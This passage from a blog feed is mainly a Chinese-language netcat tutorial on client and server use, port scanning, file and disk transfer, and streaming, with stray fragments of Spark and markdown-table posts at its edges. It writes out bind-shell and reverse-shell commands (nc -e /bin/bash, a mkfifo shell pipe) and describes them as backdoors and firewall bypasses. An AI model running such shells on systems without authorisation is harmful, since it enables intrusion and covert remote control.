        <link>https://xiazemin.github.io/MyBlog/spark/2017/09/15/spark-rdd.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/spark/2017/09/15/spark-rdd.html</guid>
        
        <category>spark</category>
        
        
        <category>spark</category>
        
      </item>
    
      <item>
        <title>netcat</title>
        <description>&lt;p&gt;NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network 
connection)。它被设计成一个可靠的后端(back-end) 工具，能被其它的程序
程序或脚本直接地或容易地驱动。同时，它又是一个功能丰富的网络调试和开
发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有
意思的内建功能&lt;/p&gt;

&lt;!-- more --&gt;
&lt;p&gt;最简单的使用方法，”nc host port”，能建立一个TCP连接，连向指定的
主机和端口。接下来，你的从标准输入中输入的任何内容都会被发送到指定的
主机，任何通过连接返回来的信息都被显示在你的标准输出上。这个连接会一
直持续下去，至到连接两端的程序关闭连接。注意，这种行为不同于大多数网
络程序，它们会在从标准输入读到一个文件结束符后退出。
　　NetCat还可以当服务器使用，监听任意指定端口的连接请求(inbound 
connection )，并可做同样的读写操作。除了较小限制外，它实际并不关心自
己以“客户端”模式还是“服务器”模式运行，它都会来回运送全部数据。在任何
一种模式下，都可以设置一个非活动时间来强行关闭连接。
　　它还可以通过UDP来完成这些功能，因此它就象一个telnet那样的UDP程序，
用来测试你的UDP服务器。正如它的“U”所指的，UDP跟TCP相比是一种不可靠的
数据传输，一些系统在使用UDP 传送大量数据时会遇到麻烦，但它还有一些用
途。
　　你可能会问“为什么不用telnet来连接任意的端口”？问题提得好(valid)，
这儿有一些理由。Telnet有“标准输入文件结束符(standard input EOF)”问题，
所以需要在脚本中延迟计算以便等待网络输出结束。这就是netcat持续运行直
到连接被关闭的主要原因。Telnet也不能传输任意的二进制数据，因为一些特
定的字符会被解释为Telnet的参数而被从数据流中去除。Telnet还将它的一些
诊断信息显示到标准输出上，而NetCat会将这信息与它的输出分开以不改变真
实数据的传输，除非你要求它这么做。当然了，Telnet也不能监听端口，也不
能使用UDP。 NetCat没有这些限制，比Telnet更小巧和快捷，而且还有一些其
它的功能。&lt;/p&gt;

&lt;p&gt;　　NetCat的一些主要功能：&lt;/p&gt;

&lt;p&gt;*支持连出和连入(outbound and inbound connection)，TCP和UDP，任意源和目的端口
*全部DNS正向/反向检查，给出恰当的警告
*使用任何源端口
*使用任何本地设置的网络资源地址
*内建端口扫描功能，带有随机数发生器
*内建loose source-routing功能
*可能标准输入读取命令行参数
*慢发送模式，每N秒发送一行
*以16进制显示传送或接收的数据
*允许其它程序服务建立连接，可选
*对Telnet应答，可选&lt;/p&gt;

&lt;h1 id=&quot;编译netcat&quot;&gt;编译NetCat&lt;/h1&gt;
&lt;p&gt;　　编译NetCat是非常简单的。检查一下Makefile，找到符合你的系统类型的
SYSTYPE如何拼写,然后运行“make”，然后可执行的nc就会出现了。如果没有合
适的SYSTYPE，用”generic”试试。
　　其Makefile中有dos, ultrix, sunos, solaris-static, solaris, aix, 
linux, irix, osf, freebsd, bsdi, netbsd, hpux, unixware, aux, next, 
generic等SYSTYPE，其中generic不算系统类型，则dos其实并不支持。在本文
一开始的NetCat的链接页面中，也有一个Windows 版本的NetCat，是另一个人
做的移植。
　　Linux的sys/time.h并不真正支持FD_SETSIZE的 表示，编译时会有一个无
害的警告。在一些系统中编译时，可能会与signal()有关的指针类型警告，但
不影响编译结果。&lt;/p&gt;

&lt;h1 id=&quot;开发netcat的功能&quot;&gt;开发NetCat的功能&lt;/h1&gt;
&lt;p&gt;　　NetCat小巧且功能强大，描述它的功能就是象描述瑞士军刀的功能一样。
　　如果没有提供命令行参数，NetCat会提示你从标准输入来输入命令参数，
然后NetCat会在内部解析输入。用这种办法输入命令式参数，可以用来防止借
助“ps”来查看你的命令行参数。
　　主机参数可以是一个名字或一个IP地址。如果-n出现，则它接受IP地址，
而不再对计算机的名字或域名进行解析。如果没有-n，但加上-v，则NetCat可
进行正/反向域名解析，并警告the all-too-common problem of mismatched 
name in DNS 。这会耗费稍多一点时间，但在某些情况下会有用处。如，你想
知道某个IP的主机名，NetCat可省却你手工查找的时间。
　　要建立对外的连接，必须提供一个端口号，可以是个数字，也可以
/etc/services列表中的端口服务名。当-n 出现时，则只有数字形式的端口可
以接收。
　　-v参数，可以将一些关于连接建立信息输出到标准错误。-v参数多出现几
次，则显示的信息会更多一些。如果-v参数没有出现，则NetCat将默默地工作，
至到出现错误为止。
　　-w参数后跟一个时间值，用以指定建立链接时的等待时间，-w如果多次出
现，则后面的值将取代前面的设置。-w还用来设置连接非活动时间，当标准输
入结束以后，如果等待指定的一段时间后仍没有数据返回，则NetCat会再试一
次，然后关闭连接并退出。
　　当-u参数出现时，用UDP建立连接。
　　用-o logfile参数，可以将连接上往来传输的数据以16进制的形式记录到
logfile中（每行的左半部分是16进制显示，右半部分为ascii显示）。其中，
每行的第一个字符为”&amp;lt;”或”&amp;gt;”，分别表示接收的数据或发送的数据。
　　NetCat用-s ip-addr或-s name来绑定本地网络资源地址，-p portarg 来
绑定本地端口。除了因权限限制或端口已经使用外，-p可以绑定任何端口。 
Root用户可以绑定保留的1024以内的端口。如果不用-p指定端口，则使用系统
给定的未使用的端口。(-p功能在客户端状态也可以使用,-s功能并不是在所有
的平台上都可用)
　　-l参数可以使NetCat以服务器状态运行。
”nc -l -p 1234 [remote hostname] [remote port]”可以用来指定入连的主机
和端口，如果申请连接的主机或端口不符指定，则会断开连接。
　　当编译时置-DGAPING_SECURITY_HOLE，则-e参数被NetCat支持。-e后面跟
一可执行程序的名称，当一个连接（入或出）被建立时，这个程序被运行。尤
其当NetCat以服务器端运行时，-e参数使其有点象inetd了， 只是只能运行一
个进行而已。需要说明的是，-e后的程序不能从NetCat的命令行接收参数，如
果有参数要传递，可能需要一个脚本。
　　当编译时置-DTELNET，则-t参数被支持，此时NetCat可以登录到一个
telnetd服务器，并提供相关的握手应答，至到出现登录提示符。
　　NetCat用8k的读写，来尽可能高效将收到数据显示到标准输出上及将标准
输入写到连接上。-i参数，可以用来设置发送一行标准输入信息的间隔，以减
少发送速度。
　　端口扫描是一探测主机服务的流行方法。NetCat的命令行中，先是参数，
再是主机，最后是端口。端口可以是一些服务名、端口号，或者是一个端口范
围（形如N-M）。
    ”nc -v -w 2 -z -i 1 20-30”用来扫描target主机的20-30(两端包含)端口，
-z表示不发送任何数据到TCP连接或非常有限的数据到UDP连接。-i用以指明两
个端口建立连接的时间的间隔。-w用以指明连接不活动时间。通常情况下，扫
描按从高到低的顺序依次扫描指定的端口，-r参数可以让NetCat在指定的端口
范围内随机地扫描端口。（当-r被用于单个连接时，本地的端口在8192以上，
除非用-p指定)
　　-g可以用来指定网关（最多可达8个），-G可以用来指定source-routing 
pointer。(这是原文，但我还是不明白。：（-g =&amp;gt; Group hops 
Many people are interested in testing network connectivity using IP 
source routing, even if it’s only to make sure their own firewalls 
are blocking source-routed packets. On systems that support it, the
-g switch can be used multiple times [up to 8] to construct a 
loose-source-routed path for your connection, and the -G argument 
positions the &lt;code&gt;hop pointer'' within the list. If your network 
allows source-routed traffic in and out, you can test connectivity 
to your own services via remote points in the internet. Note that 
although newer BSD-flavor telnets also have source-routing 
capability, it isn't clearly documented and the command syntax is 
somewhat clumsy. Netcat's handling of&lt;/code&gt;-g’’ is modeled after
``traceroute’’.）
　　NetCat不是一个任意包发生器，但可以与raw socket通话，nit/bpf/dlpi
有时也能行( nit/bpf/dlpi may appear at some point).推荐Drren Reed的
ip_filter包，里面有一个工具能创建并发送raw packets.&lt;/p&gt;

&lt;p&gt;netcat可以作为类似于telent的客户端,也可以监听某个端口作为服务器,还可
以作为扫描工具扫描对方主机的端口,还可以用来传输文件,不相信吗? 听我慢
慢道来:)
首先我们要弄明白netcat的工作原理,其实netcat的原理很简单,它就是从网络
的一端读入数据,然后输出到网络的另一端,它可以使用tcp和udp协议. 之所以
叫做netcat,因为它是网络上的cat,想象一下cat的功能,读出一个文件的内容,
然后输出到屏幕上(默认的stdout是屏幕,当然可以重定向到其他地方).netcat
也是如此,它读取一端的输入,然后传送到网络的另一端,
就这么简单.但是千万不要小看了它,netcat可以完成很多任务,,尤其是和其他
程序组合时.好了,废话少说,进入正题吧.:p 
网上有两种版本的netcat,一个是@stake公司的netcat,
http://www.atstake.com/research/tools/network_utilities/  也就是最初
的版本,还有一个是GNU的netcat.http://netcat.sourceforge.net/download.php 
我个人更倾向于使用GNU的netcat,因为它的功能更多,不过GNU的没有windows 
平台的版本:confused: 
至于编译和安装我想就不用说了,如果这关都过不了,我想也有点太……，看看
readme和install文件，一般情况下./configure&amp;amp;&amp;amp;make&amp;amp;&amp;amp;make install就ok了，
具体的./configure选项看看帮助。&lt;/p&gt;

&lt;p&gt;netcat的命令行程序名字为nc,是netcat的缩写,安装完了是找不到netcat这个
程序的.:)&lt;/p&gt;

&lt;p&gt;root@mail etc #nc -h
GNU netcat 0.7.0, a rewrite of the famous networking tool.
Basic usages:
connect to somewhere: nc [options] hostname port [port] …
listen for inbound: nc -l -p port [options] [hostname] [port] …
tunnel to somewhere: nc -L hostname:port -p port [options]&lt;/p&gt;

&lt;p&gt;Mandatory arguments to long options are mandatory for short options
too.
Options:
-c, –close close connection on EOF from stdin
-e, –exec=PROGRAM program to exec after connect
-g, –gateway=LIST source-routing hop point[s], up to 8
-G, –pointer=NUM source-routing pointer: 4, 8, 12, …
-h, –help display this help and exit
-i, –interval=SECS delay interval for lines sent, ports scanned
-l, –listen listen mode, for inbound connects
-L, –tunnel=ADDRESS:PORT forward local port to remote address
-n, –dont-resolve numeric-only IP addresses, no DNS
-o, –output=FILE output hexdump traffic to FILE (implies -x)
-p, –local-port=NUM local port number
-r, –randomize randomize local and remote ports
-s, –source=ADDRESS local source address (ip or hostname)
-t, –tcp TCP mode (default)
-T, –telnet answer using TELNET negotiation
-u, –udp UDP mode
-v, –verbose verbose (use twice to be more verbose)
-V, –version output version information and exit
-x, –hexdump hexdump incoming and outgoing traffic
-w, –wait=SECS timeout for connects and final net reads
-z, –zero zero-I/O mode (used for scanning)&lt;/p&gt;

&lt;p&gt;Remote port number can also be specified as range. Example: ‘1-1024’&lt;/p&gt;

&lt;p&gt;我用的是GNU的netcat,比起@stake公司的netcat多了-c 选项,不过这是很有用
的一个选项,后面我们会讲到.还有GNU的-L,-t ,-T选项和@stake的-L -t 用途
是不一样的,自己琢磨吧.&lt;/p&gt;

&lt;p&gt;一.客户端
这是最简单的使用方式,nc 
nc www.apache.org 80
get / http/1.1
HTTP/1.1 400 Bad Request
Date: Mon, 08 Dec 2003 06:23:31 GMT
Server: Apache/2.0.48-dev (Unix)
Content-Length: 310
Connection: close
Content-Type: text/html; charset=iso-8859-1&lt;/p&gt;

&lt;p&gt;400 Bad Request&lt;/p&gt;

&lt;p&gt;Bad Request
Your browser sent a request that this server could not understand.&lt;/p&gt;

&lt;p&gt;Apache/2.0.48-dev (Unix) Server at www.apache.org Port 80&lt;/p&gt;

&lt;p&gt;呵呵,看到了什么,我什么也没说哦:p&lt;/p&gt;

&lt;p&gt;二.简单服务器
nc -l -p //这里-l参数表明nc处于监听模式,-p指定端口号.
nc -l -p 1234[假设这台主机ip为192.168.0.1]
然后从客户端输入, nc 192.168.0.1 1234 然后你从任一端输入的数据就会显
示在另一端了.其实netcat的server和client的区别并不大,区别仅仅在于谁执
行了-l来监听端口,一旦连接建立以后,就没有什么区别了. 从这里我们也可以
了解netcat的工作原理了,通过网络链接读写数据.[It is a simple Unix 
utility which reads and writes data across network connections, 
using TCP or UDP protocol]–@stake主页是这么说的.&lt;/p&gt;

&lt;p&gt;三.telnet服务器
nc有一个-e的选项,用来指定在连接后执行的程序.
在windows平台上可以指定-e cmd.exe[winxp,win2000,] 如果是98就指定
command.exe.linux则指定-e bash,或者任何你喜欢的shell, 或者是你自己编
写的程序,通常是做为后门:p
指定-e的效果是由你指定的程序代替了nc自己来接受另一端的输入,并把输入
(命令)后反馈的结果显示到另一端.
server: nc -l -p 1234 -e bash
client: nc 192.168.0.1 1234 就可以远程登陆server了
其实我们不一定非要在server端指定-e,也可以在client端指定.
server: nc -l -p 1234
client: nc -e 192.168.0.1 1234 .这样,就相当于在server上远程登陆client
了.我前面说过,有关client和server的区分是没有什么意义的.谁做为telnet 
server的标准只有一个,谁执行了-e [shell].&lt;/p&gt;

&lt;p&gt;四.ftp服务器
nc可以从任何地方接受输入,不仅仅是-e指定的程序,还可以是文件; nc可以将
输入重定向到任何地方,不仅仅是默认的屏幕.指定的方法很简单,使用 &amp;gt; 和
somefile
例2; server: nc -l -c -p 1234 &amp;gt;somefile
client: nc 192.168.0.1 1234 /check/host.disk1
然后,可以利用linux内核的loopback特性,把host.disk以只读的方式mount上,
然后就可以做取证分析了.
[如果真的做取证分析,一定不要在原始的受害主机硬盘上find和类似的操作,
因为这会修改时间标记而破坏原始的证据]&lt;/p&gt;

&lt;p&gt;例4. 将文件压缩后再传送.
如果你的文件很大,何不先压缩它呢,利用管道, 我们甚至不用生成压缩后的中
间文件!
源主机: tar czf - work|nc -l -c -p 1234 
目的主机: nc 192.168.0.1 1234|tar xzvf -&lt;/p&gt;

&lt;p&gt;[tar打包时最好不要使用绝对路径,虽然GNU的tar能把它转换成相对路径,但不
是所有的平台都能做到,所以如果不想把你的文件系统搞乱的话,就使用相对路
径吧!]&lt;/p&gt;

&lt;p&gt;1，端口扫描&lt;/p&gt;

&lt;p&gt;端口扫描经常被系统管理员和黑客用来发现在一些机器上开放的端口，帮助他们识别系统中的漏洞。&lt;/p&gt;

&lt;p&gt;$nc -z -v -n 172.31.100.7 21-25
可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.
z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换(谢谢@jxing 指点)&lt;/p&gt;

&lt;p&gt;v 参数指使用冗余选项（译者注：即详细输出）&lt;/p&gt;

&lt;p&gt;n 参数告诉netcat 不要使用DNS反向查询IP地址的域名&lt;/p&gt;

&lt;p&gt;这个命令会打印21到25 所有开放的端口。Banner是一个文本，Banner是一个你连接的服务发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。&lt;/p&gt;

&lt;p&gt;一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。&lt;/p&gt;

&lt;p&gt;$ nc -v 172.31.100.7 21
netcat 命令会连接开放端口21并且打印运行在这个端口上服务的banner信息。
 葱油拌面
葱油拌面
翻译于 4年前
8人顶
顶  翻译得不错哦！
Chat Server&lt;/p&gt;

&lt;p&gt;假如你想和你的朋友聊聊，有很多的软件和信息服务可以供你使用。但是，如果你没有这么奢侈的配置，比如你在计算机实验室，所有的对外的连接都是被限制的，你怎样和整天坐在隔壁房间的朋友沟通那？不要郁闷了，netcat提供了这样一种方法，你只需要创建一个Chat服务器，一个预先确定好的端口，这样子他就可以联系到你了。&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$nc -l 1567
netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。&lt;/p&gt;

&lt;p&gt;Client&lt;/p&gt;

&lt;p&gt;$nc 172.31.100.7 1567
不管你在机器B上键入什么都会出现在机器A上。
 葱油拌面
葱油拌面
翻译于 4年前
8人顶
顶  翻译得不错哦！
其它翻译版本(1)
3，文件传输&lt;/p&gt;

&lt;p&gt;大部分时间中，我们都在试图通过网络或者其他工具传输文件。有很多种方法，比如FTP,SCP,SMB等等，但是当你只是需要临时或者一次传输文件，真的值得浪费时间来安装配置一个软件到你的机器上嘛。假设，你想要传一个文件file.txt 从A 到B。A或者B都可以作为服务器或者客户端，以下，让A作为服务器，B为客户端。&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$nc -l 1567 &amp;lt; file.txt
Client
$nc -n 172.31.100.7 1567 &amp;gt; file.txt
这里我们创建了一个服务器在A上并且重定向netcat的输入为文件file.txt，那么当任何成功连接到该端口，netcat会发送file的文件内容。
在客户端我们重定向输出到file.txt，当B连接到A，A发送文件内容，B保存文件内容到file.txt.&lt;/p&gt;

&lt;p&gt;没有必要创建文件源作为Server，我们也可以相反的方法使用。像下面的我们发送文件从B到A，但是服务器创建在A上，这次我们仅需要重定向netcat的输出并且重定向B的输入文件。&lt;/p&gt;

&lt;p&gt;B作为Server&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$nc -l 1567 &amp;gt; file.txt
Client&lt;/p&gt;

&lt;p&gt;nc 172.31.100.23 1567 &amp;lt; file.txt
 葱油拌面
葱油拌面
翻译于 4年前
8人顶
顶  翻译得不错哦！
4，目录传输&lt;/p&gt;

&lt;p&gt;发送一个文件很简单，但是如果我们想要发送多个文件，或者整个目录，一样很简单，只需要使用压缩工具tar，压缩后发送压缩包。&lt;/p&gt;

&lt;p&gt;如果你想要通过网络传输一个目录从A到B。&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$tar -cvf – dir_name | nc -l 1567
Client&lt;/p&gt;

&lt;p&gt;$nc -n 172.31.100.7 1567 | tar -xvf -
这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。
在客户端我们下载该压缩包通过netcat 管道然后打开文件。&lt;/p&gt;

&lt;p&gt;如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩。&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$tar -cvf – dir_name| bzip2 -z | nc -l 1567
通过bzip2压缩&lt;/p&gt;

&lt;p&gt;Client&lt;/p&gt;

&lt;p&gt;$nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -
使用bzip2解压
 葱油拌面
葱油拌面
翻译于 4年前
6人顶
顶  翻译得不错哦！&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;加密你通过网络发送的数据&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。&lt;/p&gt;

&lt;p&gt;服务端&lt;/p&gt;

&lt;p&gt;$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &amp;gt; file.txt
使用mcrypt工具加密数据。
客户端&lt;/p&gt;

&lt;p&gt;$mcrypt –flush –bare -F -q -m ecb &amp;lt; file.txt | nc -l 1567
使用mcrypt工具解密数据。
以上两个命令会提示需要密码，确保两端使用相同的密码。&lt;/p&gt;

&lt;p&gt;这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。&lt;/p&gt;

&lt;p&gt;showme
showme
翻译于 4年前
7人顶
顶  翻译得不错哦！&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;流视频&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。&lt;/p&gt;

&lt;p&gt;服务端&lt;/p&gt;

&lt;p&gt;$cat video.avi | nc -l 1567
这里我们只是从一个视频文件中读入并重定向输出到netcat客户端
$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -
这里我们从socket中读入数据并重定向到mplayer。&lt;/p&gt;

&lt;p&gt;showme
showme
翻译于 4年前
7人顶
顶  翻译得不错哦！
7，克隆一个设备&lt;/p&gt;

&lt;p&gt;如果你已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器，而你不想在重复配置一遍。不在需要重复配置安装的过程，只启动另一台机器的一些引导可以随身碟和克隆你的机器。&lt;/p&gt;

&lt;p&gt;克隆Linux PC很简单，假如你的系统在磁盘/dev/sda上&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$dd if=/dev/sda | nc -l 1567
Client
$nc -n 172.31.100.7 1567 | dd of=/dev/sda
dd是一个从磁盘读取原始数据的工具，我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中，它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区，我们可以根据我们系统root分区的位置，更改sda 为sda1，sda2.等等。
 葱油拌面
葱油拌面
翻译于 4年前
6人顶
顶  翻译得不错哦！
8，打开一个shell&lt;/p&gt;

&lt;p&gt;我们已经用过远程shell-使用telnet和ssh，但是如果这两个命令没有安装并且我们没有权限安装他们，我们也可以使用netcat创建远程shell。&lt;/p&gt;

&lt;p&gt;假设你的netcat支持 -c -e 参数(默认 netcat)&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$nc -l 1567 -e /bin/bash -i
Client
$nc 172.31.100.7 1567
这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash
假如netcat 不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell&lt;/p&gt;

&lt;p&gt;Server&lt;/p&gt;

&lt;p&gt;$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc -l 1567 &amp;gt; /tmp/tmp_fifo
这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&amp;gt;&amp;amp;1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口1567上。至此，我们已经把netcat的输出重定向到fifo文件中。
说明：&lt;/p&gt;

&lt;p&gt;从网络收到的输入写到fifo文件中&lt;/p&gt;

&lt;p&gt;cat 命令读取fifo文件并且其内容发送给sh命令&lt;/p&gt;

&lt;p&gt;sh命令进程受到输入并把它写回到netcat。&lt;/p&gt;

&lt;p&gt;netcat 通过网络发送输出到client&lt;/p&gt;

&lt;p&gt;至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。&lt;/p&gt;

&lt;p&gt;在客户端仅仅简单连接到服务器&lt;/p&gt;

&lt;p&gt;Client&lt;/p&gt;

&lt;p&gt;$nc -n 172.31.100.7 1567
你会得到一个shell提示符在客户端
 葱油拌面
葱油拌面
翻译于 4年前
7人顶
顶  翻译得不错哦！
其它翻译版本(1)
反向shell&lt;/p&gt;

&lt;p&gt;反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。&lt;/p&gt;

&lt;p&gt;服务端&lt;/p&gt;

&lt;p&gt;$nc -l 1567
在客户端，简单地告诉netcat在连接完成后，执行shell。
客户端&lt;/p&gt;

&lt;p&gt;$nc 172.31.100.7 1567 -e /bin/bash
现在，什么是反向shell的特别之处呢 
反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为172.31.100.7，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;指定源端口&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。&lt;/p&gt;

&lt;p&gt;服务器端&lt;/p&gt;

&lt;p&gt;$nc -l 1567
客户端&lt;/p&gt;

&lt;p&gt;$nc 172.31.100.7 1567 -p 25
使用1024以内的端口需要root权限。&lt;/p&gt;

&lt;p&gt;该命令将在客户端开启25端口用于通讯，否则将使用随机端口。&lt;/p&gt;

&lt;p&gt;Lax
Lax
翻译于 4年前
6人顶
顶  翻译得不错哦！&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;指定源地址&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;假设你的机器有多个地址，希望明确指定使用哪个地址用于外部数据通讯。我们可以在netcat中使用-s选项指定ip地址。&lt;/p&gt;

&lt;p&gt;服务器端&lt;/p&gt;

&lt;p&gt;$nc -u -l 1567 &amp;lt; file.txt
客户端&lt;/p&gt;

&lt;p&gt;$nc -u 172.31.100.7 1567 -s 172.31.100.5 &amp;gt; file.txt
该命令将绑定地址172.31.100.5。&lt;/p&gt;

&lt;p&gt;这仅仅是使用netcat的一些示例。&lt;/p&gt;

&lt;p&gt;其它用途有：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用-t选项模拟Telnet客户端，
HTTP客户端用于下载文件，
连接到邮件服务器，使用SMTP协议检查邮件，
使用ffmpeg截取屏幕并通过流式传输分享，等等。其它更多用途。 简单来说，只要你了解协议就可以使用netcat作为网络通讯媒介，实现各种客户端。
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Fri, 15 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/jekyll/2017/09/15/netcat.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/jekyll/2017/09/15/netcat.html</guid>
        
        
        <category>jekyll</category>
        
      </item>
    
      <item>
        <title>markdown-table</title>
        <description>&lt;ol&gt;
  &lt;li&gt;方案一：
markdown原生语法可以生成表格,在字段左右加｜分隔，第二行 | -   |-:| :—–: |
例如
&lt;code&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;水果&lt;/td&gt;
      &lt;td&gt;价格&lt;/td&gt;
      &lt;td&gt;数量&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code&gt;| -   |-:| :--: |

| 香蕉        | $1      |   5    |

| 苹果        | $1      |   6    |

| 草莓        | $1      |   7    |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;显示效果&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;水果&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;价格&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;数量&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;香蕉&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;$1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;苹果&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;$1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;草莓&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;$1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Academy&lt;/th&gt;
      &lt;th&gt;score&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Harry Potter&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gryffindor&lt;/td&gt;
      &lt;td&gt;90&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Hermione Granger&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Gryffindor&lt;/td&gt;
      &lt;td&gt;100&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Draco Malfoy&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Slytherin&lt;/td&gt;
      &lt;td&gt;90&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;!-- more --&gt;
&lt;ol&gt;
  &lt;li&gt;方案二
markdown和html语法兼容，可以使用html的table
例如：&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;lineno&quot;&gt; 1 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2 &lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;设备&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
